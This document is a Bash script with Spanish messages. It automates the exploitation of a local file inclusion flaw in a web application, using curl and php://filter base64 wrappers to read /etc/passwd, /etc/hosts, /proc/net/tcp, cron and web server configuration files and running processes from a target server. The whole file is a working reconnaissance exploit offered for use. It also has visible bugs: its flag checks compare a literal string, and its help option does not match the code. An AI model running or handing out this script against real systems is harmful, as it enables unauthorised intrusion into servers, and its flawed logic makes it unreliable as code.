#!/bin/bash

red="\e[0;31m\033[1m"
enc="\033[0m\e[0m"
declare -i flag_b64=0
declare -i flag_null_byte=0

# ------------------------------------- # 
function ayuda(){
    echo -e "\n --- USO ------------------------------------ \n "
	echo -e "programa.sh url_del_lfi\n"
	echo -e "Opcion -d para base64\n"
}

# ------------------------------------- # 


if [ $# == 2 ]; then
	url=$1
elif [ $# == 3 ] && [ $2 == "-b" ]; then
	url=$1
	flag_b64=1
else 
	ayuda
fi


# -------------------------------------- # 
echo -ne "\n${red}[*] Nombre del sistema:${enc} "
if [ flag_b64 == 0  ]; then
	url_name="$url/etc/hostname"
	curl -s $url_name 
else
	url_name="${url}php://filter/convert.base64-encode/resource=/etc/hostname"
	curl -s $url_name | base64 -d
fi

# -------------------------------------- #

echo -ne "${red}[*] Usuarios del sistema:${enc} "
if [ flag_b64 == 0 ]; then
	url_passwd="$url/etc/passwd"
	curl -s $url_passwd | grep "sh" | awk '{print $1}' FS=":" | tr "\n" "," | sed "s/,/, /g" 
else
	url_passwd="${url}php://filter/convert.base64-encode/resource=/etc/passwd"
	curl -s $url_passwd | base64 -d | grep "sh" | awk '{print $1}' FS=":" | tr "\n" "," | sed "s/,/, /g"
fi

# -------------------------------------- # 

echo -ne "\n${red}[*] Puertos abiertos:${enc} "
if [ flag_b64 == 0 ]; then
	url_ports="$url/proc/net/tcp"
	for port in $(curl -s $url_ports | awk '{print $2}' | awk '{print $2}' FS=":"); do echo "$((16#$port))" | tr "\n" "," | sed "s/,/, /g" ; done
else
    url_ports="${url}php://filter/convert.base64-encode/resource=/proc/net/tcp"
	for port in $(curl -s $url_ports | base64 -d | awk '{print $2}' | awk '{print $2}' FS=":"); do echo "$((16#$port))" | tr "\n" "," | sed "s/,/, /g" ; done
fi

# -------------------------------------- # 

echo -ne "\n${red}[*] Direcciones IP:${enc} "
if [ flag_b64 == 0 ]; then
	url_fibtrie="$url/proc/net/fib_trie"
	curl -s $url_fibtrie | grep "LOCAL" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | tr "\n" "," | sed "s/,/, /g" 
else
	url_fibtrie="${url}php://filter/convert.base64-encode/resource=/proc/net/fib_trie"
	curl -s $url_fibtrie | base64 -d | grep "LOCAL" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | tr "\n" "," | sed "s/,/, /g"
fi

# -------------------------------------- # 

echo -ne "\n${red}[*] Dominios:${enc} "
if [ flag_b64 == 0 ]; then
	url_hosts="$url/etc/hosts"
	curl -s $url_hosts | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | awk '{print $2}' | grep -v "localhost" | tr "\n" "," | sed "s/,/, /g"
else
	url_hosts="${url}php://filter/convert.base64-encode/resource=/etc/hosts"
	curl -s $url_hosts | base64 -d | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | awk '{print $2}' | grep -v "localhost" | tr "\n" "," | sed "s/,/, /g"
fi

# -------------------------------------- #

url_apache1="$url/etc/apache/sites-enabled/000-default.conf"
url_nginx1="$url/etc/nginx/sites-enabled/default"
url_nginx2="$url/etc/nginx/sites-avaiable/default"
if [ flag_b64 == 0 ]; then
	if [[ $(curl -s $url_apache1) ]]; then 
		echo -ne "\n${red}[*] Archivo de configuración de apache:${enc}\n"
		curl -s $url_apache1 
	elif [[ $(curl -s $url_nginx1 ) ]]; then 
		echo -ne "\n${red}[*] Archivo de configuración de nginx:${enc}\n"
		curl -s $url_nginx1
	elif [[ $(curl -s $url_nginx2 ) ]]; then 
		echo -ne "\n${red}[*] Archivo de configuración de nginx:${enc}\n"
		curl -s $url_nginx2
	fi
else
	if [[ $(curl -s $url_apache1) ]]; then
	    echo -ne "\n${red}[*] Archivo de configuración de apache:${enc}\n"
		url_apache1="${url}php://filter/convert.base64-encode/resource=/etc/apache/sites-enabled/000-default.conf"
    	curl -s $url_apache1 | base64 -d 
	elif [[ $(curl -s $url_nginx1 ) ]]; then
    	echo -ne "\n${red}[*] Archivo de configuración de nginx:${enc}\n"
		url_nginx1="${url}php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default"
    	curl -s $url_nginx1 | base64 -d 
	elif [[ $(curl -s $url_nginx2 ) ]]; then
    	echo -ne "\n${red}[*] Archivo de configuración de nginx:${enc}\n"
		url_nginx2="${url}php://filter/convert.base64-encode/resource=/etc/nginx/sites-avaiable/default"
    	curl -s $url_nginx2 | base64 -d 
	fi
fi

# -------------------------------------- # 

echo -ne "\n${red}[*] Tareas CRON:${enc}\n"
if [ flag_b64 == 0 ]; then
	url_cron="$url/etc/crontab"
	curl -s $url_cron | grep -P "^\d" 
else
	url_cron="${url}php://filter/convert.base64-encode/resource=/etc/crontab"
	curl -s $url_cron | base64 -d | grep -P "^\d"
fi

# -------------------------------------- # 

echo -ne "\n${red}[*] Procesos en ejecucíon:${enc}\n"
if [ flag_b64 == 0 ]; then
	url_debug="$url/proc/sched_debug"
	curl -s $url_debug | grep -P "\d" | grep -E "^ S|^ I" | grep -vE "scsi|system|kworker|card|irq|dbus|rcu" | awk '{print $2 " -> " $3}'
else
	url_debug="${url}php://filter/convert.base64-encode/resource=/proc/sched_debug" 
	curl -s $url_debug | base64 -d | grep -P "\d" | grep -E "^ S|^ I" | grep -vE "scsi|system|kworker|card|irq|dbus|rcu" | awk '{print $2 " -> " $3}'
fi


